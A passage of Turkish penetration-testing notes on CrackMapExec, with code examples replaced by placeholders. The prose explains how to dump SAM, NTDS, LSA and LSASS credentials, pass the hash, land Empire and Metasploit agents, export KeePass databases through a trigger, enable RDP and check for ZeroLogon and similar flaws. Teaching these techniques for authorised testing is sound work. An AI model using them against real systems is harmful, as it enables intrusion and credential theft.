Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

